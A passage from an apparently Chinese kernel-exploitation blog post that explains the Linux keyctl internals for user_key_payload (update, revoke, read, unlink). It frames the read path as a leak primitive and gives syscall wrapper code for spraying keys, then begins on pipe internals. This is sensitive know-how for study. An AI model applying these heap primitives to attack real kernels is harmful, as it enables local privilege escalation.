class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * key_update - Update a key&#x27;s contents.</span><br><span class="hljs-comment"> * @key_ref: The pointer (plus possession flag) to the key.</span><br><span class="hljs-comment"> * @payload: The data to be used to update the key.</span><br><span class="hljs-comment"> * @plen: The length of @payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Attempt to update the contents of a key with the given payload data.  The</span><br><span class="hljs-comment"> * caller must be granted Write permission on the key.  Negative keys can be</span><br><span class="hljs-comment"> * instantiated by this method.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns 0 on success, -EACCES if not permitted and -EOPNOTSUPP if the key</span><br><span class="hljs-comment"> * type does not support updating.  The key type may return other errors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">key_ref_t</span> key_ref, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload, <span class="hljs-type">size_t</span> plen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key_preparsed_payload</span> <span class="hljs-title">prep</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">key</span> =</span> key_ref_to_ptr(key_ref);<br><span class="hljs-type">int</span> ret;<br><br>key_check(key);<br><br><span class="hljs-comment">/* 该key必须可写 */</span><br>ret = key_permission(key_ref, KEY_NEED_WRITE);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/* 尝试更新 */</span><br><span class="hljs-keyword">if</span> (!key-&gt;type-&gt;update)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br><span class="hljs-built_in">memset</span>(&amp;prep, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(prep));<br>prep.data = payload;<br>prep.datalen = plen;<br>prep.quotalen = key-&gt;type-&gt;def_datalen;<br>prep.expiry = TIME64_MAX;<br><span class="hljs-keyword">if</span> (key-&gt;type-&gt;preparse) &#123;<br>ret = key-&gt;type-&gt;preparse(&amp;prep);  <span class="hljs-comment">//类似前面user_key_payload分配，也就是在prep的payload字段附上我们新的user_key_payload</span><br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> error;<br>&#125;<br><br>down_write(&amp;key-&gt;sem);<br><br>ret = key-&gt;type-&gt;update(key, &amp;prep);  <br><br>...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到上面的最后一行，在我们调用完key-&gt;type-&gt;preparse(&amp;prep)，再调用key-&gt;type-&gt;update，它对应user_update函数，如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * update a user defined key</span><br><span class="hljs-comment"> * - the key&#x27;s semaphore is write-locked</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">user_update</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> key *key, <span class="hljs-keyword">struct</span> key_preparsed_payload *prep</span>)</span><br>&#123;<br><span class="hljs-keyword">struct</span> user_key_payload *zap = NULL;<br><span class="hljs-built_in">int</span> ret;<br><br><span class="hljs-comment">/* check the quota and attach the new data */</span><br>ret = key_payload_reserve(key, prep-&gt;datalen);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/* attach the new data, displacing the old */</span><br>key-&gt;expiry = prep-&gt;expiry;<br><span class="hljs-keyword">if</span> (key_is_positive(key))<br>zap = dereference_key_locked(key);<br>rcu_assign_keypointer(key, prep-&gt;payload.data[<span class="hljs-number">0</span>]);<br>prep-&gt;payload.data[<span class="hljs-number">0</span>] = NULL;<br><br><span class="hljs-keyword">if</span> (zap)<br>call_rcu(&amp;zap-&gt;rcu, user_free_payload_rcu);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_assign_keypointer(KEY, PAYLOAD)\</span><br><span class="hljs-keyword">do</span> &#123;\<br>rcu_assign_pointer((KEY)-&gt;payload.rcu_data0, (PAYLOAD));\<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_assign_pointer(p, v)do &#123; (p) = (v); &#125; while (0)</span><br></code></pre></td></tr></table></figure><p>上面函数可以看到我们是将prep-&gt;payload.data[0],也就是我们新分配的user_key_payload赋值给key-&gt;payload.rcu_data0,这也就实现了我们的key更新，在这之后我们同样恰当的将临时存放user_key_payload的指针置空。</p><p>这里总结一下更新操作：</p><ol><li>keyctl_update_key首先分配一个临时object来存放我们传入的新payload，大小同样是我们传入的plen，然后调用key_update</li><li>key_update首先调用user_preparse(type为”user”的前提下，下面类似)，分配新的user_key_payload来存放，然后调用user_update来将payload指针更新</li><li>返回到keyctl_update_key，释放掉临时payload</li></ol><h4 id="two-KEYCTL-REVOKE"><a href="#two-KEYCTL-REVOKE" class="headerlink" title=":two:KEYCTL_REVOKE"></a>:two:KEYCTL_REVOKE</h4><p>该选项调用keyctl_revoke_key函数，具体功能是唤醒一个key</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Revoke a key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must be grant the caller Write or Setattr permission for this to</span><br><span class="hljs-comment"> * work.  The key type should give up its quota claim when revoked.  The key</span><br><span class="hljs-comment"> * and any links to the key will be automatically garbage collected after a</span><br><span class="hljs-comment"> * certain amount of time (/proc/sys/kernel/keys/gc_delay).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Keys with KEY_FLAG_KEEP set should not be revoked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 is returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_revoke_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id)</span><br>&#123;<br>...<br><span class="hljs-keyword">if</span> (test_bit(KEY_FLAG_KEEP, &amp;key-&gt;flags))<br>ret = -EPERM;<br><span class="hljs-keyword">else</span><br>key_revoke(key);<br><br>key_ref_put(key_ref);<br>error:<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其会调用key_revoke函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * key_revoke - Revoke a key.</span><br><span class="hljs-comment"> * @key: The key to be revoked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Mark a key as being revoked and ask the type to free up its resources.  The</span><br><span class="hljs-comment"> * revocation timeout is set and the key and all its links will be</span><br><span class="hljs-comment"> * automatically garbage collected after key_gc_delay amount of time if they</span><br><span class="hljs-comment"> * are not manually dealt with first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> key *key)</span><br>&#123;<br>    <br>...<br>down_write_nested(&amp;key-&gt;sem, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags)) &#123;<br>notify_key(key, NOTIFY_KEY_REVOKED, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (key-&gt;type-&gt;revoke)<br>key-&gt;type-&gt;revoke(key);<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>函数会调用key-&gt;type-&gt;revoke(&amp;key),其对应函数user_revoke</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * dispose of the links from a revoked keyring</span><br><span class="hljs-comment"> * - called with the key sem write-locked</span><br><span class="hljs-comment"> */</span><br>void user<span class="hljs-constructor">_revoke(<span class="hljs-params">struct</span> <span class="hljs-params">key</span> <span class="hljs-operator">*</span><span class="hljs-params">key</span>)</span><br>&#123;<br><span class="hljs-keyword">struct</span> user_key_payload *upayload = user<span class="hljs-constructor">_key_payload_locked(<span class="hljs-params">key</span>)</span>;<br><br><span class="hljs-comment">/* clear the quota */</span><br>key<span class="hljs-constructor">_payload_reserve(<span class="hljs-params">key</span>, 0)</span>;<br><br><span class="hljs-keyword">if</span> (upayload) &#123;<br>rcu<span class="hljs-constructor">_assign_keypointer(<span class="hljs-params">key</span>, NULL)</span>; <span class="hljs-comment">//这里将我们key里面存放的user_key_payload置空</span><br>call<span class="hljs-constructor">_rcu(&amp;<span class="hljs-params">upayload</span>-&gt;<span class="hljs-params">rcu</span>, <span class="hljs-params">user_free_payload_rcu</span>)</span>; <span class="hljs-comment">//释放原先的user_key_payload</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="three-KEYCTL-READ"><a href="#three-KEYCTL-READ" class="headerlink" title=":three:KEYCTL_READ"></a>:three:KEYCTL_READ</h4><p>泄露来力！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Read a key&#x27;s payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The key must either grant the caller Read permission, or it must grant the</span><br><span class="hljs-comment"> * caller Search permission when searched for from the process keyrings.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, we place up to buflen bytes of data into the buffer, if one</span><br><span class="hljs-comment"> * is provided, and return the amount of data that is available in the key,</span><br><span class="hljs-comment"> * irrespective of how much we copied into the buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_read_key</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> keyid, <span class="hljs-type">char</span> __user *buffer, <span class="hljs-type">size_t</span> buflen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">key</span>;</span><br><span class="hljs-type">key_ref_t</span> key_ref;<br><span class="hljs-type">long</span> ret;<br><span class="hljs-type">char</span> *key_data = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> key_data_len;<br><br>...<br><br>key_data_len = (buflen &lt;= PAGE_SIZE) ? buflen : <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (key_data_len) &#123;<br>key_data = kvmalloc(key_data_len, GFP_KERNEL); <span class="hljs-comment">//分配一个key_data_len的堆块</span><br><span class="hljs-keyword">if</span> (!key_data) &#123;<br>ret = -ENOMEM;<br><span class="hljs-keyword">goto</span> key_put_out;<br>&#125;<br>&#125;<br><br>ret = __keyctl_read_key(key, key_data, key_data_len); <span class="hljs-comment">//调用user_read函数，他会将我们原来的payload内容复制到key_data里面</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Read methods will just return the required length without</span><br><span class="hljs-comment"> * any copying if the provided length isn&#x27;t large enough.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span> || ret &gt; buflen)<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The key may change (unlikely) in between 2 consecutive</span><br><span class="hljs-comment"> * __keyctl_read_key() calls. In this case, we reallocate</span><br><span class="hljs-comment"> * a larger buffer and redo the key read when</span><br><span class="hljs-comment"> * key_data_len &lt; ret &lt;= buflen.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ret &gt; key_data_len) &#123;<br><span class="hljs-keyword">if</span> (unlikely(key_data))<br>kvfree_sensitive(key_data, key_data_len);<br>key_data_len = ret;<br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">/* Allocate buffer */</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (copy_to_user(buffer, key_data, ret))<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>kvfree_sensitive(key_data, key_data_len);<br><br>key_put_out:<br>key_put(key);<br>out:<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了user_key函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * read the key data</span><br><span class="hljs-comment"> * - the key&#x27;s semaphore is read-locked</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">user_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> key *key, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> buflen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_key_payload</span> *<span class="hljs-title">upayload</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>upayload = user_key_payload_locked(key); <span class="hljs-comment">//获取key的user_key_payload</span><br>ret = upayload-&gt;datalen;<br><br><span class="hljs-comment">/* we can return the data as is */</span><br><span class="hljs-keyword">if</span> (buffer &amp;&amp; buflen &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (buflen &gt; upayload-&gt;datalen)<br>buflen = upayload-&gt;datalen;<br><br><span class="hljs-built_in">memcpy</span>(buffer, upayload-&gt;data, buflen);<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其逻辑大概就是，keyctl_read_key首先分配一个临时堆块，然后将我们key里面的payload读入到该临时堆块当中，读多少取决于user_key_payload当中的datalen和自身的buflen，读完后，再调用copy_to_user来复制到我们的buf当中，最后释放该临时堆块,这里的返回值位upload-&gt;datalen</p><h4 id="four-KEYCTL-UNLINK"><a href="#four-KEYCTL-UNLINK" class="headerlink" title=":four:KEYCTL_UNLINK"></a>:four:KEYCTL_UNLINK</h4><p>从keyring当中注销一个key,这个倒没什么好讲的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Unlink a key from a keyring.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The keyring must grant the caller Write permission for this to work; the key</span><br><span class="hljs-comment"> * itself need not grant the caller anything.  If the last link to a key is</span><br><span class="hljs-comment"> * removed then that key will be scheduled for destruction.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Keys or keyrings with KEY_FLAG_KEEP set should not be unlinked.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, 0 will be returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">keyctl_keyring_unlink</span><span class="hljs-params">(<span class="hljs-type">key_serial_t</span> id, <span class="hljs-type">key_serial_t</span> ringid)</span><br>&#123;<br><span class="hljs-type">key_ref_t</span> keyring_ref, key_ref;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> *<span class="hljs-title">keyring</span>, *<span class="hljs-title">key</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>keyring_ref = lookup_user_key(ringid, <span class="hljs-number">0</span>, KEY_NEED_WRITE);<br><span class="hljs-keyword">if</span> (IS_ERR(keyring_ref)) &#123;<br>ret = PTR_ERR(keyring_ref);<br><span class="hljs-keyword">goto</span> error;<br>&#125;<br><br>key_ref = lookup_user_key(id, KEY_LOOKUP_PARTIAL, KEY_NEED_UNLINK);<br><span class="hljs-keyword">if</span> (IS_ERR(key_ref)) &#123;<br>ret = PTR_ERR(key_ref);<br><span class="hljs-keyword">goto</span> error2;<br>&#125;<br><br>keyring = key_ref_to_ptr(keyring_ref);<br>key = key_ref_to_ptr(key_ref);<br><span class="hljs-keyword">if</span> (test_bit(KEY_FLAG_KEEP, &amp;keyring-&gt;flags) &amp;&amp;<br>    test_bit(KEY_FLAG_KEEP, &amp;key-&gt;flags))<br>ret = -EPERM;<br><span class="hljs-keyword">else</span><br>ret = key_unlink(keyring, key);<br><br>key_ref_put(key_ref);<br>error2:<br>key_ref_put(keyring_ref);<br>error:<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-板子"><a href="#4-板子" class="headerlink" title="4.板子"></a>4.板子</h3><p>方便使用user_key_payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING-2<span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE2<span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE3<span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK9<span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ11<span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_READ, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span></span>&#123;                                                                             <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">syscall</span>(_NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="5-pipe基础知识"><a href="#5-pipe基础知识" class="headerlink" title="5.pipe基础知识"></a>5.pipe基础知识</h3><p>这里为了继续进行咱们的利用，还需要学习一个新的结构体，那就是pipe，他被实现为一个系统调用，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">IPE(2)                                                                                            Linux Programmer&#x27;s Manual                                                                                            PIPE(2)<br><br>NAME<br>       pipe, pipe2 - create pipe<br><br>SYNOPSIS<br>       #include &lt;unistd.h&gt;<br><br>       /* On Alpha, IA-64, MIPS, SuperH, and SPARC/SPARC64; see NOTES */<br>       struct fd_pair &#123;<br>           long fd[2];<br>       &#125;;<br>       struct fd_pair pipe();<br><br>       /* On all other architectures */<br>       int pipe(int pipefd[2]);<br><br>       #define _GNU_SOURCE             /* See feature_test_macros(7) */<br>       #include &lt;fcntl.h&gt;              /* Obtain O_* constant definitions */<br>       #include &lt;unistd.h&gt;<br><br>       int pipe2(int pipefd[2], int flags);<br><br>DESCRIPTION<br>       pipe()  creates  a pipe, a unidirectional data channel that can be used for interprocess communication.  The array pipefd is used to return two file descriptors referring to the ends of the pipe.  pipefd[0] refers to<br>       the read end of the pipe.  pipefd[1] refers to the write end of the pipe.  Data written to the write end of the pipe is buffered by the kernel until it is read from the read end of the pipe.  For further details, see<br>       pipe(7).<br><br>       If flags is 0, then pipe2() is the same as pipe().  The following values can be bitwise ORed in flags to obtain different behavior:<br><br></code></pre></td></tr></table></figure><p>说到这个管道，我们对他的第一印象那肯定是进程之间的交互，不妨我们往深处想一想他的原理，我们该如何使得两个进程有信息交换呢？一种无非是创建一个文件，然后两个进程分别往里面读写，这是一种可行的方式，而如果我们不采用与硬盘联系的方式呢，因为与硬盘交互太累了并且也太慢，所以我们转头可以到他的内核方向去想，因为每个进程的用户空间不同，但是内核空间都是相同的，那么我们就可以在内核中开辟一段空间，使得我们不同的进程可以同时访问，这就使得两者之间存在了一个通讯的桥梁，也被称作管道。</p><p>他的使用方法我们可以查看linux手册，十分方便。大致意思就是，在内核空间创建一个虚拟的inode，该inode一般是作为文件指针以及描述文件的功能而存在，这里仅仅是凭空创建，并不设计文件的产生。创建完inode后，则将当前进程的一个文件描述符赋值，具体赋值写描述符还是读描述符则靠程序员自身指定，一般pipe_fd[0]为读指针，pipe_fd[1]为写指针，手册里面的实例更类似于匿名管道（可能有错误</p><p>接下来我们在源码层面来深入了解一下其利用点</p><p>首先我们需要找到pipe系统调用的一个源码，它位于<code>fs/pipe.c</code>当中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 